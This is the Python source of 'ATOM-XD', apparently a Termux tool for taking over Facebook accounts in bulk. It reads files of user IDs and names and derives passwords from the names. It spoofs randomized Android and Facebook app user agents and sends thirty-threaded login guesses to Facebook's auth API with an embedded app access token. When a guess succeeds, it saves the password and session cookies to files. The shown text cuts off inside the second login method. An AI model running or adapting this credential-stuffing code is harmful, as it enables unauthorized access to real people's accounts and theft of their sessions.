#__________/MODULE\__________#
import os,random,uuid,string,hashlib,json,base64,zlib,pip,urllib,urllib3,platform,math,smtplib,os,base64,zlib,pip,urllib,datetime,time,subprocess,re,sys,platform,pytz
from os import system,path,remove
from pip._vendor import requests
from datetime import datetime
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from bs4 import BeautifulSoup as sop
from time import localtime as lt
from urllib.request import urlopen
from urllib.error import URLError as errorlib
from string import *
from concurrent.futures import ThreadPoolExecutor as ThreadPool
try:
	import pycurl
	from io import BytesIO
except:
	system("pip install pycurl")
	import pycurl
	from io import BytesIO
try:
        system("clear")
except ModuleNotFoundError:
        print(f'\033[1;92m/\033[1;92m=\033[1;92m/\033[1;92m INSTALLING MISSING MODULES ');system('pip install requests futures==2 > /dev/null')
except Exception as e:
    pass
#__________/INSTALL\__________#
#__________/COLOR\__________#
G="\033[1;92m";W="\x1b[38;5;15m";B="\033[1;34m";Y="\x1b[38;5;226m";A="\x1b[38;5;123m";R="\33[1;91m";O="\x1b[38;5;81m";X="\x1b[38;5;205m";P="\033[0;34m"
#__________/STYLE\__________#
xp=f"{W}/{G}={W}/";xp1=f"{W}/{G}1{W}/";xp2=f"{W}/{G}2{W}/";xp3=f"{W}/{G}3{W}/";xp4=f"{W}/{G}4{W}/";xp5=f"{W}/{G}5{W}/";xp6=f"{W}/{G}6{W}/";xp7=f"{W}/{G}7{W}/";xp8=f"{W}/{G}8{W}/";xp0=f"{W}/{G}0{W}/";xpx=f"{W}/{G}?{W}/";xpxx=f"{G}━{W}➤➤"
#__________/SYS\__________#
sys.stdout.write('\x1b[1;37m\x1b]2; ATOM~XD\x07')
#__________/FILE-PATH\__________#
sd_folder = "/sdcard/ATOM-XD"
sea_folder = ("FILE","RANDOM","GMAIL","OLD","AUTO-CREATE")
os.makedirs(sd_folder, exist_ok=True)
for sea_folder in sea_folder:
    os.makedirs(os.path.join(sd_folder, sea_folder), exist_ok=True)
#__________/DATE\__________#
dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
days = datetime.now().day
months = dic[(str(datetime.now().month))]
years = datetime.now().year
date = f'{W}'+str(days)+f'{G}/{W}'+str(months)+f'{G}/{W}'+str(years)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#__________/COUNTRY\__________#
"""def __countryX__():
	ip = requests.get("https://ipi"+"nfo.io").json()
	country = requests.get(f'https://restcountries.com/v3.1/alpha/{requests.get("https://ipinfo.io").json()["country"]}').json()[0]['name']['common']
	return country"""
#__________/GREETING\__________#
def greet_bd():
    bd_timezone = pytz.timezone("Asia/Dhaka")
    bd_time = datetime.now(bd_timezone).hour
    if 5 <= bd_time < 12:
        return "GOOD MORNING"
    elif 12 <= bd_time < 18:
        return "GOOD AFTERNOON"
    else:
        return "GOOD NIGHT"
#__________/SIM-NAME\__________#
__simX__ = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace('\n','').replace(',',f'\x1b[38;5;205m {G}/{W} ')
#__________/KEY\__________#
xppx = hashlib.md5((platform.version()).replace(' ','').encode()).hexdigest().upper()
#__________/CALL-AREA\__________#
#country = __countryX__()
greeting = greet_bd()
current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
#__________/METHOD\__________#
__methodX__ = f"{xp1} METHOD {W}/{G}M1{W}/ {xpxx} {W}/{G}API{W}/\n{xp2} METHOD {W}/{G}M2{W}/ {xpxx} {W}/{G}API{W}/\n{xp3} METHOD {W}/{G}M3{W}/ {xpxx} {W}/{G}B-API{W}/\n{xp4} METHOD {W}/{G}M4{W}/ {xpxx} {W}/{G}GRAPH{W}/\n{xp5} METHOD {W}/{G}M5{W}/ {xpxx} {W}/{G}GRAPH{W}/\n{xp6} METHOD {W}/{G}M6{W}/ {xpxx} {W}/{G}B-GRAPH{W}/\n{xp7} METHOD {W}/{G}M7{W}/ {xpxx} {W}/{G}B-GRAPH{W}/\n{xp8} METHOD {W}/{G}M8{W}/ {xpxx} {W}/{G}HOST{W}/"
__methodXX__ = f"{xp1} METHOD {W}/{G}M1{W}/ {xpxx} {W}/{G}API{W}/\n{xp2} METHOD {W}/{G}M2{W}/ {xpxx} {W}/{G}B-API{W}/\n{xp3} METHOD {W}/{G}M3{W}/ {xpxx} {W}/{G}B-API{W}/\n{xp4} METHOD {W}/{G}M4{W}/ {xpxx} {W}/{G}GRAPH{W}/\n{xp5} METHOD {W}/{G}M5{W}/ {xpxx} {W}/{G}GRAPH{W}/\n{xp6} METHOD {W}/{G}M6{W}/ {xpxx} {W}/{G}B-GRAPH{W}/\n{xp7} METHOD {W}/{G}M7{W}/ {xpxx} {W}/{G}HOST{W}/\n{xp8} METHOD {W}/{G}M8{W}/ {xpxx} {W}/{G}NORMAL{W}/"
#__________/CODE\__________#
__codeX__ = f"{xp} EXAMPLE  {xpxx} 016 {G}/{W} 017 {G}/{W} 018 {G}/{W} 019"
__codeXX__ = f"{xp} EXAMPLE  {xpxx} 91639 {G}/{W} 91687 {G}/{W} 91612 {G}/{W} 91623"
#__________/LIMIT\__________#
__limitX__ = f"{xp} EXAMPLE  {xpxx} 6666 {G}/{W} 7777 {G}/{W} 8888 {G}/{W} 9999"
#__________/SELF\__________#
class __seaX__:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.twf = []
        self.gen = []
        self.plist = []
        self.world = []
        self.numX = []
#__________/CLEAR_&_LINE\__________#
    def __clearX__(self):self.__logoX__()
    def __lineX__(self):print(f"{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#__________/EXIT\__________#
    def __exitX__(self):print(f"{xp} THANK'S FOR USING ATOM TOOLS....! ")
#__________/UA-AREA\__________#
    def __UPD__(self):
    	mix = random.choice(["SM-T835","SM-S901U","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F","CPH2083","CPH2235", "CPH2499","CPH2185","CPH2065","CPH2197","CPH1989","CPH2145","F1w","CPH1909","CPH2065","CPH1937","CPH2095","CPH2083","CPH2249","CPH2083","CPH2239","CPH1979","CPH2067","CPH2069","CPH2239","CPH2015","CPH2021","CPH2205","CPH2069","CPH2161","CPH2207","CPH2239","CPH1909","CPH2185","CPH2127","CPH1923","CPH1931","PHN110", "CPH2599", "CPH2499", "CPH2557", "CPH8686", "CPH9177", "CPH9226", "OPPO F1 Plus", "CPH2071", "PCHM00", "CPH2083", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH2477", "CPH2471", "CPH2591", "CPH1923", "CPH1925", "CPH1837", "OPPO A30","RMX1945", "RMX1911", "RMX2193", "RMX1945", "RMX1931", "RMX2170", "RMX3201", "RMX2180", "RMX2021", "RMX2020", "RMX2155", "RMX1921", "RMX2156", "RMX3363", "RMX3081", "RMX2001", "RMX2001", "RMX3263", "RMX2155", "RMX2001", "RMX3195", "RMX1945", "RMX1945", "RMX1993","vi"+"vo 1901","V2"+"026","V20"+"58","viv"+"o 1716","vi"+"vo 1808","vi"+"vo 1935","vi"+"vo 1951","vi"+"vo 1906","vivo 1808","vivo 1920","vivo 1901", "V2026","V2058","vivo 1716","vivo 1935","vivo 1951","vivo 1906","V2111","vivo 1915","V1911A","V2036","vivo 1907","vivo 1906","vivo 1915","V2025","vivo 1820","vivo 1904","vivo 1901","V1955A","LG-H342","Redmi Note 4", "Redmi 4X", "Redmi 3", "Redmi 4", "Redmi 3X", "Redmi Note 7", "Redmi 6A", "Redmi Note 8 Pro", "Redmi 5A", "Redmi 5", "Redmi 6 Pro", "Redmi Note 5", "Redmi Note 4", "Redmi Y2", "Redmi 7A", "Redmi Note 7S", "Redmi Note 8T", "Redmi Note 8 Pro", "M2003J15SC", "Redmi 5 Plus", "Redmi Note 9 Pro", "Redmi Note 9S", "LDN-L21", "M2103K19G","RMX1945","RMX1911","RMX2193","RMX1945","RMX1931","RMX2170","RMX3201","RMX2180","RMX2021","RMX2020","RMX2155","RMX1921","RMX2156","RMX3363","RMX3081","RMX2001","RMX2001","RMX3263","RMX2155","RMX2001","RMX3195","RMX1945","RMX1945","RMX1993","RMX2180","RMX3630","RMX3686","RMX1805","RMX1801","RMX2020","RMX1811","RMX3063","RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921","vivo 1906","vivo 1904","vivo Y13L","vivo 1901","V2120","V2204","vivo 1902","V2310","V2333","vivo 1929","vivo 1915","vivo 1811","V2027","V2043","V2038","V2111","V2110","V2206","V2207","vivo Y23L","V2249","vivo 1613","vivo Y28L","vivo 1938","PADM00","CPH1837","PADT00","CPH1803","CPH1853","CPH1805","CPH1931","CPH1959","CPH1933","CPH1935","CPH1943","CPH1909","CPH1901","PDBM00","CPH1941","CPH2179","CPH2083","CPH2185","CPH2185","CPH2477","CPH2591","CHP2219","CPH1923","CPH2213","CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"])
    	fban = random.choice(["FB4A","FB5A","FB6A"])
    	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
    	fb_ver_code = str(random.randint(10000000, 66666666))
    	density = random.choice(['1.0','1.7','2.0','2.25','2.5','3.0','3.5'])
    	width = random.randint(720, 1440)
    	height = random.randint(1080, 2560)
    	fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
    	sim_name = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Skitto","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
    	fbpn = random.choice(["com.facebook.katana","com.facebook.orca","messenger-android","com.facebook.lite"])
    	fbmf = 'Realme'
    	fbbd = 'Realme'
    	mobile_model = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
    	modelx = random.choice(["RMX3871","RMX5011","RMX3709","RMX3951","RMX3987","RMX2063","RMX5003","RMX3092","RMX3115","RMX1921","RMX2071","RMX3300","RMX3551","RMX2195","RMX3393","RMX2050","RMX3987","RMX2117","RMX3690","RMX2180"])
    	last = f"[FBAN/{fban};FBAV/{facebook_version};FBBV/{fb_ver_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{fblc};FBCR/{sim_name};FBMF/{fbmf};FBBD/{fbbd};FBPN/{fbpn};FBDV/{modelx};FBSV/{mobile_model};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {mix} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+last
    	return ua
#___________RANDOM#_________
    def __UDP__(self):
    	fb_ver = random.choice(['520.0.0.44.99','518.0.0.63.86','516.0.0.73.90','519.0.0.44.92','518.0.0.66.86'])
    	fb_ver_code = random.choice(['310813944','310813941','311013939','310814037','310813960'])
    	fuck = random.choice(['{density=2.625,width=1080,height=2195}','{density=1.75,width=720,height=1448}','{density=1.75,width=720,height=1471}','{density=3.0,width=1080,height=2168}'])
    	fuck_sim = random.choice(['Robi','Banglalink','Grameenphone','Airtel'])
    	oppo_model = random.choice(['Ativ SE','Galaxy Note Edge','Galaxy Note Fan Edition','Galaxy Note II','Galaxy A24','Galaxy A3 (2015)','Galaxy J2 Duos'])
    	android_ver = random.choice(['5.1.1','6.0.1','7.1.2','9','10','11','12','8.1.0','7.0','13','14'])
    	randm_ua = f'[FBAN/FB4A;FBAV/'+fb_ver+';FBBV/'+fb_ver_code+';FBDM/'+fuck+';FBLC/en_US;FBRV/0;FBCR/'+fuck_sim+';FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/'+oppo_model+';FBSV/'+android_ver+';FBOP/1;FBCA/arm64-v8a:;]'
    	return randm_ua
#__________/LOGO\__________#
    def __logoX__(self):
    	if sys.platform.lower() == "win":system("cls")
    	elif sys.platform.lower() == "linux":system("clear")
    	else:raise NameError(f'{xp} SOMETHING WENT WRONG{R}!!')
    	print(f"""
{G}  ┏━┓┏━╸┏━┓   ╻ ╻╺┳┓  ●{W} DEVELOPER {xpxx} MR.DIP
{W}  ┗━┓┣╸ ┣━┫{G}╺━╸{W}┏╋┛ ┃┃{G}  ●{W} STATUS    {xpxx} PREMIUM
{G}  ┗━┛┗━╸╹ ╹   ╹ ╹╺┻┛  ●{W} VERSION   {xpxx} V{G}/{W}0.1
{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{xp} FUTURES  {xpxx} FILE{G}〤{W}RANDOM{G}〤{W}GMAIL{G}〤{W}OLD{G}〤{W}AUTO
{xp} GREET    {xpxx} {greeting}
{xp} TODAYS   {xpxx} {date}
{xp} COUNTRY  {xpxx} HELLO WORLD
{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{xp} YOUR KEY {xpxx} {xppx}
{xp} YOUR SIM {xpxx} {__simX__}
{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________/APPROVEL\__________#
#__________/MENU\__________#
    def __menuX__(self):
    	self.__clearX__();print(f"{xp1} FILE CLONING ");print(f"{xp2} RANDOM CLONING ");print(f"{xp3} OLD CLONING ");print(f"{xp4} AUTO CREATE ");print(f"{xp0} EXIT TOOLS ");self.__lineX__();__menchoiX__ = input(f"{xpx} CHOICE MENU {xpxx} ")
    	if __menchoiX__ == ("1"):self.__fileXX__()
    	elif __menchoiX__ == ("2"):self.__randX__()
    	elif __menchoiX__ == ("3"):self.__oldX__()
    	elif __menchoiX__ == ("4"):self.__autoX__()
    	elif __menchoiX__ == ("0"):self.__exitX__()
    	else:self.__lineX__();print(f'{xp} OPTION NOT VALID ');self.__lineX__();time.sleep(1);print(f"{xp} TRY AGAIN ");self.__lineX__();time.sleep(1);self.__menuX__()
#__________/FILE-TYPE\__________#
    def __fileXX__(self):
    	self.__clearX__();print(f"{xp1} FRESH FILE ");print(f"{xp2} CP FILE ");print(f"{xp0} BACK MENU ");self.__lineX__();__fileeX__ = input(f"{xpx} FILE TYPE {xpxx} ")
    	if __fileeX__ == ("1"):self.__fileX__()
    	elif __fileeX__ == ("2"):self.__fileX__()
    	elif __fileeX__ == ("0"):self.__menuX__()
    	else:self.__lineX__();print(f'{xp} OPTION NOT VALID ');self.__lineX__();time.sleep(1);print(f"{xp} TRY AGAIN ");self.__lineX__();time.sleep(1);self.__fileXX__()
#__________/FILE\__________#
    def __fileX__(self):
    	self.__clearX__();print(f"{xp} EXAMPLE  {xpxx} /sdcard/ATOM.txt {G}/{W} ATOM.txt");self.__lineX__();__fileloX__ = input(f"{xpx} INPUT FILE {xpxx} ")
    	try:__fileeX__ = "/sdcard/"+__fileloX__;__fileeX__ = __fileloX__;__fileeXX__ = __fileeX__;__fileckX__ = open(__fileeXX__,'r').read().splitlines()
    	except FileNotFoundError:self.__lineX__();print(f'{xp} FILE NOT FOUND ');self.__lineX__();time.sleep(1);print(f"{xp} TRY AGAIN ");self.__lineX__();time.sleep(1);self.__fileX__()
    	self.__clearX__();print(__methodX__);self.__lineX__();__methcX__ = input(f"{xpx} CHOICE METHOD {xpxx} ");self.__clearX__();print(f"{xp} NOTE     {xpxx} AUTO PASSWORD ONLY BD WORKING ");self.__lineX__();print(f"{xp1} CRACK WITH AUTO PASSWORD\n{xp2} CRACK WITH CUSTOM PASSWORD");self.__lineX__();__fipasX__ = input(f"{xpx} CHOICE PASSLIST {xpxx} ")
    	if __fipasX__ == ("1"):self.plist.append('firstlast');self.plist.append('first last');self.plist.append('first12');self.plist.append('first123');self.plist.append('first1234');self.plist.append('first12345');self.plist.append('first');self.plist.append('first@');self.plist.append('first@@');self.plist.append('first@@@');self.plist.append('first@@@@');self.plist.append('first@#');self.plist.append('first##');self.plist.append('first111');self.plist.append('@first@');self.plist.append('@@first@@');self.plist.append('@@first@@');self.plist.append('First123');self.plist.append('i love you');self.plist.append('bangladesh');self.plist.append('@freefire@')
    	else:
    	    try:
    	        self.__clearX__();print(f"{xp} EXAMPLE {xpxx} BANGLADESH PASSWORD 10{G}-{W}15 LIMIT\n{xp} EXAMPLE {xpxx} OTHERS COUNTRY PASSWORD 5{G}-{W}10 LIMIT");self.__lineX__()
    	        ps_limit = int(input(f'{xpx} PASSWORD LIMIT {xpxx}{W} '))
    	    except:ps_limit = 5
    	    self.__clearX__();print(f"{xp} EXAMPLE {xpxx} firstlast {G}/{W} first12 {G}/{W} first123 ");self.__lineX__()
    	    for i in range(ps_limit):self.plist.append(input(f'{xp} ENTER PASSWORD {W}/{G}{i+1}{W}/ {xpxx}{W} '))
    	with ThreadPool(max_workers=30) as __seaaX__:
    	    self.__clearX__();total_ids = str(len(__fileckX__));print(f"{xp} TOTAL UID{G}/{W}METHOD {xpxx} {W}{total_ids}{G}/{W}M{__methcX__}");print(f"{xp} IF NO RESULT ON{G}/{W}OFF AIRPLANE MODE");self.__lineX__()
    	    for user in __fileckX__:
    	        ids,names = user.split('|');passlist = self.plist
    	        if __methcX__ in ("1"):__seaaX__.submit(self.___M1___,ids,names,passlist)
    	        elif __methcX__ in ("2"):__seaaX__.submit(self.___M2___,ids,names,passlist)
    	        elif __methcX__ in ("3"):__seaaX__.submit(self.___M3___,ids,names,passlist)
    	        elif __methcX__ in ("4"):__seaaX__.submit(self.___M4___,ids,names,passlist)
    	        elif __methcX__ in ("5"):__seaaX__.submit(self.___M5___,ids,names,passlist)
    	        elif __methcX__ in ("6"):__seaaX__.submit(self.___M6___,ids,names,passlist)
    	        elif __methcX__ in ("7"):__seaaX__.submit(self.___M7___,ids,names,passlist)
    	        elif __methcX__ in ("8"):__seaaX__.submit(self.___M8___,ids,names,passlist)
    	        else:__seaaX__.submit(self.___M1___,ids,names,passlist)
    	print('\033[1;37m');print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');print(f'{xp} THE PROCESS HAS COMPLETED...');print(f'{xp} TOTAL {G}OK{W}/{R}CP {xpxx}{G} '+str(len(self.oks))+f'{W}/{R}'+str(len(self.cps)));print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');self.__exitX__()
#__________/FILE-M1\__________#
    def ___M1___(self,ids,names,passlist):
        try:
            global loop,oks,cps
            color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r{xp}{W}-{W}/{color}ATOM-XD{W}/{G}-{W}/{color}{self.loop}{W}/{G}-{W}/{G}{len(self.oks)}{W}/{G}-{W}/{R}{len(self.cps)}{W}/ ');sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                family = str(uuid.uuid4())
                advertiser_id = str(uuid.uuid4())
                data = {'adid': adid,'format': 'json','device_id': device_id,'cpl': 'true','family_device_id': family,'credentials_type': 'device_based_login_password','error_detail_type': 'button_with_disabled','source': 'device_based_login',
                'email': ids,'password': pas,
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32','generate_session_cookies': '1','meta_inf_fbmeta': '','advertiser_id': advertiser_id,'currently_logged_in_userid': '0',
                'locale': 'en_GB','client_country_code': 'GB',
                'method': 'auth.login','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key': '882a8490361da98702bf97a021ddc14d'}
                headers = {'User-Agent': self.__UPD__(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                url = 'https://api.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers).json()
                if 'session_key' in po:
                    ids = str(po['uid'])
                    colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f'\r{xp}{G}-{W}/{G}ATOM-OK{W}/{G} '+ids+f'{W} / {G}'+pas+'\033[1;97m')
                    print(f'\r{xp}{G}-{W}/{G}COOKIE{W}/{colorX} sb=Cracked.By-Dip_Tool;'+coki);print(f'\r{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                    open('/sdcard/ATOM-XD/FILE/ATOM-M1-OK.txt','a').write(ids+'/'+pas+'/sb=Cracked.By-Dip_Tool;'+coki+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f'\r{xp}{G}-{W}/{R}ATOM-CP{W}/{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
                    open('/sdcard/ATOM-XD/FILE/ATOM-M1-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
        except Exception as e:
            pass
#__________/FILE-M2\__________#
    def ___M2___(self,ids,names,passlist):
        try:
            global loop,oks,cps
            color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r{xp}{W}-{W}/{color}ATOM-XD{W}/{G}-{W}/{color}{self.loop}{W}/{G}-{W}/{G}{len(self.oks)}{W}/{G}-{W}/{R}{len(self.cps)}{W}/ ');sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                family = str(uuid.uuid4())
                advertiser_id = str(uuid.uuid4())
                data = {'adid': adid,'format': 'json','device_id': device_id,'cpl': 'true','family_device_id': family,'credentials_type': 'device_based_login_password','error_detail_type': 'button_with_disabled','source': 'device_based_login',
                'email': ids,'password': pas,
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32','generate_session_cookies': '1','meta_inf_fbmeta': '','advertiser_id': advertiser_id,'currently_logged_in_userid': '0',
                'locale': 'en_GB','client_country_code': 'GB',
